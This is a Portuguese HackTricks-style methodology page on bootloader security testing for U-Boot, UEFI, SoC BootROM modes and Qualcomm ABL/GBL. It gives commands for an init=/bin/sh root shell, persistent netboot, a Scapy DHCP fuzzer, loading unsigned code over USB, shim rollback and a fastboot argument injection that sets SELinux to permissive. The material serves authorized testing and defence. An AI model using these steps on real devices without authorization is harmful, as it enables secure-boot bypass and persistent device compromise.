# Testes de bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar as configurações de inicialização do dispositivo e testar bootloaders como U-Boot e carregadores da classe UEFI. Foque em obter execução antecipada de código, avaliar as proteções de assinatura/rollback e explorar caminhos de recuperação ou inicialização pela rede.

Relacionado: bypass do secure boot da MediaTek via patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Ganhos rápidos com U-Boot e abuso do ambiente

1. Acesse o shell do interpretador
   - Durante a inicialização, pressione uma tecla de interrupção conhecida (geralmente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes da execução de `bootcmd` para acessar o prompt do U-Boot.<sup>[[1]](#references)</sup>

2. Inspecione o estado de inicialização e as variáveis
   - Comandos úteis:
     - `printenv` (exibe o ambiente)
     - `bdinfo` (informações da placa, endereços de memória)
     - `help bootm; help booti; help bootz` (métodos de inicialização de kernel compatíveis)
     - `help ext4load; help fatload; help tftpboot` (carregadores disponíveis)

3. Modifique os argumentos de inicialização para obter um root shell
   - Acrescente `init=/bin/sh` para que o kernel abra um shell em vez de executar o init normal:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Faça netboot a partir do seu servidor TFTP
   - Configure a rede e obtenha uma imagem de kernel/FIT da LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persistir alterações por meio do ambiente
   - Se o armazenamento de env não estiver protegido contra gravação, você poderá persistir o controle:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam os caminhos de fallback. Valores mal configurados podem permitir acesso repetido ao shell.

6. Verifique recursos de debug/inseguros
   - Procure por: `bootdelay` > 0, `autoboot` desativado, `usb start; fatload usb 0:1 ...` sem restrições, possibilidade de usar `loady`/`loads` via serial, `env import` de mídia não confiável e kernels/ramdisks carregados sem verificações de assinatura.

7. Teste de imagem/verificação do U-Boot
   - Se a plataforma alegar usar secure/verified boot com imagens FIT, tente imagens não assinadas e adulteradas:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado de `verify=n` geralmente permite inicializar payloads arbitrários.
   - Não pare em um simples resultado de permitir/negar: pesquisas recentes sobre FIT mostraram que o próprio caminho de verificação pode ser uma superfície de ataque pré-autenticação. Faça testes negativos com dados FIT armazenados externamente (`data-offset`, `data-position`, `data-size`), seleção de configuração assinada, `loadables` e tratamento de overlay / `extra-conf`.
   - Se você tiver uma árvore de código-fonte correspondente, `test/vboot/vboot_test.sh` é uma maneira rápida de reproduzir o comportamento de verificação FIT no U-Boot sandbox antes de tocar em hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e fluxos de inicialização por script
   - Em builds modernos do U-Boot, `bootcmd` costuma ser apenas um wrapper em torno do Standard Boot. Isso significa que mídias graváveis, PXE ou flash SPI podem se tornar o verdadeiro limite de confiança, mesmo quando o ambiente visível parece inofensivo.
   - O `bootmeth` de `extlinux` procura `extlinux/extlinux.conf` em `/` e `/boot`; o `bootmeth` de script procura primeiro `boot.scr.uimg` e depois `boot.scr`. Na inicialização pela rede, o nome do script pode vir de `boot_script_dhcp`.
   - Comandos úteis para triagem:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casos de abuso a testar: mídia USB/SD controlada pelo atacante posicionada antes em `boot_targets`, `/boot/extlinux/extlinux.conf` com permissão de escrita, servidor TFTP malicioso fornecendo `boot.scr` ou execução de script via SPI através de `script_offset_f`.
   - Se a plataforma depender de verificação FIT, certifique-se de que as configurações sejam assinadas no nível da configuração, e não apenas por imagem; `required-mode=all` é mais rigoroso do que aceitar qualquer chave obrigatória.

## Superfície de netboot (DHCP/PXE) e servidores maliciosos

9. Fuzzing de parâmetros PXE/DHCP
   - O tratamento legado de BOOTP/DHCP do U-Boot já apresentou problemas de segurança de memória. Por exemplo, o CVE‑2024‑42040 descreve divulgação de memória por meio de respostas DHCP elaboradas, que podem vazar bytes da memória do U-Boot pela rede.<sup>[[4]](#references)</sup> Exercite os caminhos de código DHCP/PXE com valores excessivamente longos ou em casos-limite (nome do arquivo de boot na opção 67, opções de fornecedor, campos de arquivo/nome do servidor) e observe se ocorrem travamentos ou leaks.
   - Trecho mínimo de Scapy para estressar os parâmetros de boot durante o netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valide também se os campos de nome de arquivo PXE são passados à lógica do shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do SO.

10. Testes de command injection em servidores DHCP rogue
   - Configure um serviço DHCP/PXE rogue e tente injetar caracteres nos campos de nome de arquivo ou opções para alcançar interpretadores de comandos em etapas posteriores da cadeia de boot. O auxiliar DHCP do Metasploit, `dnsmasq` ou scripts personalizados de Scapy funcionam bem. Isole primeiro a rede do laboratório.

## Modos de recuperação da ROM do SoC que sobrescrevem o boot normal

Muitos SoCs expõem um modo "loader" de BootROM que aceita código via USB/UART mesmo quando as imagens flash são inválidas. Se os fuses de secure boot não estiverem gravados, isso pode permitir execução arbitrária de código bem no início da cadeia.

- NXP i.MX (Serial Download Mode)
  - Ferramentas: `uuu` (mfgtools3) ou `imx-usb-loader`.
  - Exemplo: `imx-usb-loader u-boot.imx` para carregar e executar um U-Boot personalizado a partir da RAM.
- Allwinner (FEL)
  - Ferramenta: `sunxi-fel`.
  - Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Ferramenta: `rkdeveloptool`.
  - Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para carregar um loader e enviar um U-Boot personalizado.

Verifique se os eFuses/OTP de secure boot do dispositivo estão gravados. Caso contrário, os modos de download da BootROM frequentemente contornam qualquer verificação de nível superior (U-Boot, kernel, rootfs), executando diretamente seu payload de primeiro estágio a partir da SRAM/DRAM.

## Bootloaders UEFI/classe PC: verificações rápidas

11. Testes de adulteração do ESP, rollback e inscrição de chaves
   - Monte a EFI System Partition (ESP) e verifique se há componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logotipos do fornecedor.
   - Despeje o estado do Secure Boot e os bancos de dados de chaves a partir do SO, quando possível:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Se a plataforma estiver em Setup Mode, aceitar o cadastro de chaves sem autenticação ou vier com uma Platform Key de teste/padrão (classe PKfail), um administrador local ou atacante com acesso físico poderá cadastrar sua própria KEK/db e manter o Secure Boot aparentemente “enabled” enquanto inicializa binários EFI arbitrários.<sup>[[3]](#references)</sup>
   - Tente inicializar com componentes de boot assinados desatualizados ou sabidamente vulneráveis se as revogações do Secure Boot (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, muitas vezes será possível carregar seu próprio kernel ou `grub.cfg` a partir da ESP para obter persistência.

12. Testes de revogação de shim / SBAT / dbx desatualizados
   - Shims antigos assinados pela Microsoft e forks de fornecedores ainda podem servir como caminho de bootkit no estilo BYOVD se as revogações estiverem desatualizadas. Em um laboratório isolado, coloque um shim historicamente vulnerável na ESP e tente encadear a inicialização do seu próprio `grubx64.efi` ou kernel.<sup>[[11]](#references)</sup>
   - Triagem rápida:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Se o shim ainda for executado apesar de estar na lista de revogação, o firmware/OS tem atualizações `dbx` desatualizadas ou confia em um loader derivado que nunca herdou as proteções SBAT upstream.

13. Bugs de parsing de logo de boot (classe LogoFAIL)
   - Vários firmwares OEM/IBV eram vulneráveis a falhas de parsing de imagens no DXE que processa logos de boot. Se um atacante puder colocar uma imagem criada especialmente na ESP em um caminho específico do fornecedor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar, pode ser possível executar código durante o boot inicial, mesmo com o Secure Boot ativado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos podem ser gravados pelo OS.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16): lacunas de confiança

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, valide se o ABL **autentica** o app UEFI que carrega da partição `efisp`. Se o ABL apenas verifica a **presença** de um app UEFI e não verifica as assinaturas, uma write primitive para `efisp` permite **execução de código não assinado pré-OS** durante o boot.<sup>[[6]](#references)[[7]](#references)</sup>

Verificações práticas e caminhos de exploração:

- **write primitive em `efisp`**: É necessário ter uma forma de gravar um app UEFI personalizado em `efisp` (root/serviço privilegiado, bug em app OEM, caminho de recovery/fastboot). Sem isso, a lacuna no carregamento do GBL não pode ser explorada diretamente.<sup>[[6]](#references)</sup>
- **Injeção de argumentos OEM do fastboot** (bug no ABL): Algumas builds aceitam tokens extras em `fastboot oem set-gpu-preemption` e os acrescentam à linha de comando do kernel. Isso pode ser usado para forçar o SELinux permissivo, permitindo gravações em partições protegidas:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Se o dispositivo estiver corrigido, o comando deve rejeitar argumentos extras.<sup>[[5]](#references)[[6]](#references)</sup>
- **Desbloqueio do bootloader via flags persistentes**: Um payload executado durante o boot pode alterar flags persistentes de desbloqueio (por exemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sem passar pelas restrições de servidor/aprovação do OEM. Isso altera o estado de forma duradoura após a próxima reinicialização.<sup>[[6]](#references)</sup>

Notas defensivas/de triagem:

- Confirme se o ABL verifica a assinatura do payload GBL/UEFI de `efisp`. Caso contrário, trate `efisp` como uma superfície de persistência de alto risco.
- Verifique se os handlers OEM do fastboot do ABL foram corrigidos para **validar a quantidade de argumentos** e rejeitar tokens adicionais.<sup>[[8]](#references)[[9]](#references)</sup>

## Cuidados com o hardware

Tenha cuidado ao interagir com a flash SPI/NAND durante o boot inicial (por exemplo, ao aterrar pinos para contornar leituras) e consulte sempre a folha de dados da flash. Curtos-circuitos no momento errado podem corromper o dispositivo ou o programador.

## Notas e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para transferir blobs de ambiente entre a RAM e o armazenamento; algumas plataformas permitem importar o ambiente de mídias removíveis sem autenticação.
- Para persistência em sistemas baseados em Linux que inicializam via `extlinux.conf`, muitas vezes basta modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot quando não há verificações de assinatura.
- Se o alvo usar atualizações de slot duplo/A/B, consulte as técnicas de anti-rollback e slot-desync na [visão geral da análise de firmware](README.md) para não deixar passar falhas de confiança exclusivas do atualizador, fora do próprio bootloader.
- Se o userland fornecer `fw_printenv/fw_setenv`, verifique se `/etc/fw_env.config` corresponde ao armazenamento real do ambiente. Offsets incorretos permitem ler/gravar na região MTD errada.

## References

- [1] [Metodologia de teste de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Encontrando o LogoFAIL: os perigos da análise de imagens durante a inicialização do sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: chaves de plataforma não confiáveis comprometem o Secure Boot no ecossistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalhes de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: desbloqueando dispositivos Xiaomi por meio de duas strings não sanitizadas](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit do GBL do Qualcomm Snapdragon 8 Elite permite que invasores desbloqueiem bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arquitetura do Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: corrigir a propagação de entrada não confiável para a linha de comando do kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: adicionar verificação ao comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Inapto para inicializar: quebrando a verificação de assinatura FIT do U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota sobre vulnerabilidade VU#616257 - bootloaders shim UEFI assinados pela Microsoft vulneráveis a bypass do Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
